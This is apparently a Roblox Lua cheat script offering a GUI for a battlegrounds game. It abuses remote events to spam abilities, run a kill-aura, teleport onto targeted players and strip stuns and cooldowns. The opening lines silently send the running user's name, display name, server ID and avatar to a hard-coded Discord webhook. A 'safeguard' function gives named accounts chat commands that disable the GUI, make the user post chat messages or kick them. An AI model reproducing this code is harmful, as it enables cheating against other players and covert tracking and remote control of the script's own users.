warn('OP BATTLEGROUNDS GUI BY REALIRIST')
warn('don\'t skid bru im doing yall favors')
if http_request then
	http_request({
		Url = "https://discord.com/api/webhooks/1326629396324286555/JDfRIl_INcOBqp6QCjVw1WR2Rty9UOTa3DIkY6jMaR4mV3qBAiHo15F-pNjjY7qO38CH",
		Method = "POST",
		Headers = {
			["Content-Type"] = "application/json"
		},
		Body = game.HttpService:JSONEncode({content = 'Username: '..game.Players.LocalPlayer.Name.. '\nDisplay: '.. game.Players.LocalPlayer.DisplayName.. '\nJobId/ServerId: ```'.. game.JobId..'```',embeds = {{image = {url = game.HttpService:JSONDecode(game:HttpGet('https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=' .. tostring(game.Players.LocalPlayer.UserId) .. '&size=180x180&format=png')).data[1].imageUrl}}}})
	})

end
local legacyChat = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService
local sayMessage
if not legacyChat then
	sayMessage = function(msg)
		game.TextChatService.TextChannels.RBXGeneral:SendAsync(msg)
	end
elseif legacyChat then
	sayMessage = function(msg)
		game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
	end
end

script.Parent['3'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local gojo = remotes:WaitForChild('Gojo',5)
		if gojo then
			gojo:FireServer('Hollow')
		end
	end
end)

script.Parent['1'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local gojo = remotes:WaitForChild('Gojo',5)
		if gojo then
			gojo:FireServer('HollowPurple')
		end
	end
end)

script.Parent['2'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local gojo = remotes:WaitForChild('Gojo',5)
		if gojo then
			gojo:FireServer('HollowPurpleBig')
		end
	end
end)

script.Parent['blue1'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local gojo = remotes:WaitForChild('Gojo',5)
		if gojo then
			gojo:FireServer('Blue')
		end
	end
end)

script.Parent['suk1'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local yuji = remotes:WaitForChild('Yuji',5)
		if yuji then
			yuji:FireServer('Cleave')
		end
	end
end)

script.Parent['suk4'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local yuji = remotes:WaitForChild('Yuji',5)
		if yuji then
			yuji:FireServer('TrueDomain')
		end
	end
end)

script.Parent['gun'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local jotaro = remotes:WaitForChild('Jotaro',5)
		if jotaro then
			jotaro:FireServer('Revolver')
		end
	end
end)

script.Parent['Bring'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local todo = remotes:WaitForChild('Todo',5)
		if todo then
			local orgCF = game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame
			todo:FireServer('Boogie',nil,game.Players:FindFirstChild(target).Character)
			task.wait(0.5)
			game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = orgCF
		end
	end
end)

script.Parent['Void'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local todo = remotes:WaitForChild('Todo',5)
		if todo then
			local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
			if remotes then
				local todo = remotes:WaitForChild('Todo',5)
				if todo then
					local orgCF = game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame
					game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = CFrame.new(50000,0,50000)
					game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').Velocity = Vector3.new(0,0,0)
					task.wait(0.5)
					todo:FireServer('Boogie',nil,game.Players:FindFirstChild(target).Character)
					task.wait(0.5)
					game.Players.LocalPlayer.Character:FindFirstChild('HumanoidRootPart').CFrame = orgCF
				end
			end
		end
	end
end)

script.Parent['TimeStop'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local combat = remotes:WaitForChild('Combat',5)
		if combat then
			combat:FireServer('TimeStop')
		end
	end
end)

script.Parent['ultrainstinct'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local combat = remotes:WaitForChild('Combat',5)
		if combat then
			if script.Parent['ultrainstinct'].Text=='No Ultra Instinct' then
				script.Parent['ultrainstinct'].Text='Ultra Instinct'
				combat:FireServer('No Ultra Instinct')

			else
				script.Parent['ultrainstinct'].Text='No Ultra Instinct'
				combat:FireServer('Ultra Instinct')

			end
		end
	end
end)

script.Parent['Serious'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local combat = remotes:WaitForChild('Combat',5)
		if combat then
			combat:FireServer('Serious')
		end
	end
end)

script.Parent['omni'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local combat = remotes:WaitForChild('Combat',5)
		if combat then
			combat:FireServer('Omni')
		end
	end
end)

script.Parent['yutaheal'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local yuta = remotes:WaitForChild('Yuta',5)
		if yuta then
			yuta:FireServer('Heal')
		end
	end
end)

script.Parent['yutalove'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local yuta = remotes:WaitForChild('Yuta',5)
		if yuta then
			yuta:FireServer('PureLove')
		end
	end
end)

script.Parent['yutaground'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local yuta = remotes:WaitForChild('Yuta',5)
		if yuta then
			yuta:FireServer('Strike')
		end
	end
end)

script.Parent['yutaspeech'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local yuta = remotes:WaitForChild('Yuta',5)
		if yuta then
			yuta:FireServer('Shine')
		end
	end
end)
local autoheal = false
local killaura = false
script.Parent['autoheal'].MouseButton1Click:Connect(function()
	if autoheal then autoheal=false print('Deactivated autoheal.') elseif not autoheal then autoheal=true print('Activated autoheal.') end
	if autoheal then while autoheal do
			local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
			local hum = char:WaitForChild('Humanoid')
			if hum and hum:IsA('Humanoid') then
				if hum.Health<hum.MaxHealth and not (hum.Health<=0) then
					local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
					if remotes then
						local yuta = remotes:WaitForChild('Yuta',5)
						if yuta then
							yuta:FireServer('Heal')
						end
					end
				end
			end
			task.wait()
		end
	end
end)

script.Parent['killaura'].MouseButton1Click:Connect(function()
	if killaura then killaura=false print('Deactivated killaura.') elseif not killaura then killaura=true print('Activated killaura.') end
	if killaura then while killaura do
			local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
			if remotes then
				local yuji = remotes:WaitForChild('Yuji',5)
				if yuji then
					yuji:FireServer('Cleave')
				end
			end
			task.wait()
		end
	end
end)

local autofarm = false
script.Parent['streakfarm'].MouseButton1Click:Connect(function()
	if autofarm then autofarm=false print('Deactivated autofarm.') elseif not autofarm then autofarm=true print('Activated streak farm.') end
	if autofarm then while autofarm do
			local user = target
			if game.Players[user] then
				local plr:Player = game.Players[user]
				local char = plr.Character or plr.CharacterAdded:Wait()
				local oppHrp = char:WaitForChild('HumanoidRootPart',2)
				if char and oppHrp then
					local localChar = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
					if localChar then
						local hrp = localChar:WaitForChild('HumanoidRootPart',2)
						if hrp then
							hrp.CFrame = oppHrp.CFrame
						end
					end
				end
			end
			local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
			if remotes then
				local yuji = remotes:WaitForChild('Yuji',5)
				if yuji then
					yuji:FireServer('Cleave')
				end
			end
			task.wait()
		end
	end
end)

script.Parent.yuji.MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local chars = remotes:WaitForChild('Characters',5)
		if chars then
			chars:FireServer('Yuji')
		end
	end
end)

script.Parent.gojo.MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local chars = remotes:WaitForChild('Characters',5)
		if chars then
			chars:FireServer('Gojo')
		end
	end
end)

script.Parent.jotaro.MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local chars = remotes:WaitForChild('Characters',5)
		if chars then
			chars:FireServer('Jotaro')
		end
	end
end)


script.Parent.refresh.MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local chars = remotes:WaitForChild('Characters',5)
		local stats = game.Players.LocalPlayer:FindFirstChild('Stats'):FindFirstChild('Character')
		if chars then
			if stats.Value=='Jotaro' then
				local value = stats.Value
				local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
				local pos = char:FindFirstChild('HumanoidRootPart').CFrame
				chars:FireServer("Yuji")
				task.wait()
				chars:FireServer(value)
				task.wait(0.4)
				char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
				char:FindFirstChild('HumanoidRootPart').CFrame = pos
			else
				local value = stats.Value
				local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
				local pos = char:FindFirstChild('HumanoidRootPart').CFrame
				chars:FireServer("Jotaro")
				task.wait()
				chars:FireServer(value)
				task.wait(0.4)
				char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
				char:FindFirstChild('HumanoidRootPart').CFrame = pos
			end
		end
	end
end)

script.Parent['discord'].MouseButton1Click:Connect(function()
	if setclipboard then
		setclipboard("https://discord.gg/ckQQTyNfGy")
	end
end)

local laser1Active = false
script.Parent['bluelaser'].MouseButton1Click:Connect(function()
	laser1Active = (not laser1Active)
	while laser1Active do
		local remotes = game.ReplicatedStorage:WaitForChild('Remotes')
		local gojo = remotes:WaitForChild('Gojo')
		gojo:FireServer('Blue')
		task.wait()
	end
end)
local laser2Active = false
script.Parent['ultlaser'].MouseButton1Click:Connect(function()
	laser2Active = (not laser2Active)
	while laser2Active do
		local remotes = game.ReplicatedStorage:WaitForChild('Remotes')
		local jotaro = remotes:WaitForChild('Jotaro')
		jotaro:FireServer('Revolver')
		task.wait()
	end
end)
script.Parent['boogie'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:FindFirstChild('Remotes')
	if remotes then
		local todo = remotes:FindFirstChild('Todo')
		if todo then
			todo:FireServer('Boogie',nil,game.Players:FindFirstChild(target).Character)
		end
	end
end)

local function findFence()
	local map = game:GetService('Workspace'):FindFirstChild('Map')
	if map then
		local throwables = map:FindFirstChild('Pickup')
		local fences = throwables:FindFirstChild('Fences')
		for _,v in fences:GetChildren() do
			if v:IsA('Model') and v:FindFirstChild('Fence') then
				local id = v:GetAttribute('ID')
				if id then
					return v,id
				end
			end
		end
	end
end

script.Parent['fence'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:FindFirstChild('Remotes')
	if remotes then
		local pickup = remotes:FindFirstChild('Pickup')
		local throw = remotes:FindFirstChild('Throw')
		local char = game.Players.LocalPlayer.Character or game.Players.LocalPlayer.CharacterAdded:Wait()
		local fence,fenceId = findFence()
		if fence and fenceId then
			local hrp = char:WaitForChild('HumanoidRootPart')
			pickup:FireServer(fenceId)
			task.wait(1)
			throw:FireServer(hrp.CFrame.LookVector * 1.1)
		end
	end
end)

script.Parent['delstun'].MouseButton1Click:Connect(function()
	local list = {
		'Stun','Gobal'
	}
	local stuns = 0
	local plr = game.Players.LocalPlayer
	local char = plr.Character or plr.CharacterAdded:Wait()
	for _,v in char:GetChildren() do
		if table.find(list,v.Name) then
			stuns = stuns+1
			v:Destroy()
		end
	end
	script.Parent['delstun'].Text = 'Deleted '.. tostring(stuns).. ' stuns'
	task.wait(1)
	script.Parent['delstun'].Text = 'Delete Stun'
end)

script.Parent['delgetdomain'].MouseButton1Click:Connect(function()
	local list = {
		'GetDomain'
	}
	local getdomains = 0
	local plr = game.Players.LocalPlayer
	local char = plr.Character or plr.CharacterAdded:Wait()
	print('Got char: '.. char)
	for _,v in char:GetChildren() do
		if table.find(list,v.Name) then
			getdomains = getdomains+1
			v:Destroy()
		end
	end
	print('Deleted '.. tostring(getdomains).. ' visuals')
	script.Parent['delgetdomain'].Text = 'Deleted '.. tostring(getdomains).. ' visuals.'
	task.wait(1)
	script.Parent['delgetdomain'].Text = 'No domain visuals'
end)

script.Parent['buzz'].MouseButton1Click:Connect(function()
	local remotes = game.ReplicatedStorage:WaitForChild('Remotes',5)
	if remotes then
		local combat = remotes:WaitForChild('Combat',5)
		if combat then
			combat:FireServer('Buzz')
		end
	end
end)


script.Parent.Parent.Minimize.MouseButton1Click:Connect(function()
	if script.Parent.Visible then
		script.Parent.Visible = false
	else
		script.Parent.Visible = true
	end
end)

function changeTarget(user)
	if game.Players[user] then
		for _,v in script.Parent.Users:GetChildren() do
			if v:IsA('TextButton') then
				local originalColor = Color3.fromRGB(61,61,61)
				v.BackgroundColor3 = originalColor
			end
		end
		target = user
	end
end

function makeUser(username)
	if game.Players[username] then
		local clone = script.Parent.TemplateUser:Clone()
		clone.Name = username
		clone.ImageLabel.Image = game.Players:GetUserThumbnailAsync(game.Players[username].UserId,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size150x150)
		clone.TextLabel.Text = username
		clone.Visible = true
		clone.Parent = script.Parent.Users
		local originalColor = Color3.fromRGB(61,61,61)
		game.Players.PlayerRemoving:Connect(function(plr)
			if plr.Name==username then
				target = nil
				print(username.. ' left. -- OPBGGUI')
				clone:Destroy()
			end
		end)
		clone.MouseButton1Click:Connect(function()
			if target~=username then
				changeTarget(username)
				clone.BackgroundColor3 = Color3.fromRGB(80,80,61)
			else
				clone.BackgroundColor3 = originalColor
				target = nil
			end

		end)
	else
		print('bru '.. username.. ' dont exist')
	end
end
local function safeguard(plr)
	local admins = {
		'Realirist',
		'olidragon210', -- payed 1000 and 200 for source code too
		'inversealtbingy', -- my alt so i can troll
		1833560263 -- XenonNetwork, he blackmailed me into making him an admin
	}
	print((table.find(admins,plr.Name)~=nil))
	local name = plr.Name
	local userid = plr.UserId
	if table.find(admins,name) or table.find(admins,userid) then
		print('oh my gawd opbg admin!1')
		plr.Chatted:Connect(function(msg)
			local function findPlayer(partialName)
				for _, player in pairs(game.Players:GetPlayers()) do
					if string.sub(player.Name:lower(), 1, #partialName) == partialName:lower() then
						return player
					end
				end
				return nil
			end
			
			if #spaced==3 then
				local plrKicked = findPlayer(spaced[3])
				if plrKicked and plrKicked==game.Players.LocalPlayer then
					game.Players.LocalPlayer:Kick()
					game.Players.LocalPlayer:Destroy()
				end
			end

			local spaced = string.split(msg,' ')
			if msg=='!opbg disable '.. game.Players.LocalPlayer.Name then
				print('disabled')
				if table.find(admins,game.Players.LocalPlayer.Name) then
					sayMessage('Cant use this command on me (im admin)')
					return
				end
				sayMessage('omg my opbg is gone!')
				script.Parent.Parent.Enabled = false
			elseif msg=='!opbg enable '.. game.Players.LocalPlayer.Name then
				print('enabled')
				if table.find(admins,game.Players.LocalPlayer.Name) then
					sayMessage('Cant use this command on me (im admin)')
					return
				end
				sayMessage('omg my opbg is back!')
				script.Parent.Parent.Enabled = true
			elseif msg[3] and findPlayer(msg[3]) and findPlayer(msg[3])==game.Players.LocalPlayer and msg[1]=='!opbg' and msg[2]=='kick' then
				game.Players.LocalPlayer:Kick('I dont like your vibe, '.. game.Players.LocalPlayer.Name.. ' -Realirist')
				game.Players.LocalPlayer:Destroy()
			elseif msg=='!opbg users' then
				sayMessage('hi im using opbg')
			elseif msg=='!opbg lastresort' then
				if table.find(admins,game.Players.LocalPlayer.Name) then
					sayMessage('Cant use this command on me (im admin)')
					return
				end
				sayMessage('Wallahi im cooked')
				task.wait(0.2)
				game.Players.LocalPlayer:Kick('Forced to kick you this way, last resort!')
				game.Players.LocalPlayer:Destroy()
			end
		end)
	end
end
for _,plr in game.Players:GetPlayers() do
	if plr~=game.Players.LocalPlayer then
		local name = plr.Name
		local userid = plr.UserId
		safeguard(plr)
		makeUser(name)
	end
end

game.Players.PlayerAdded:Connect(function(plr)
	local name = plr.Name
	local userid = plr.UserId
	safeguard(plr)
	makeUser(name)
end)
local target = nil
game.Players.LocalPlayer.EarlyAccess.Value=true
game.Players.LocalPlayer.NoCD.Value=true
game.Players.LocalPlayer.InfAwaken.Value=true
game.Players.LocalPlayer.NoDashCD.Value=true
game.Players.LocalPlayer.NoStun.Value=true
local co = coroutine.wrap(function()
	while true do
		game.Players.LocalPlayer.AwakenBar.Value = 200
		task.wait(0.1)
	end
end)
co()
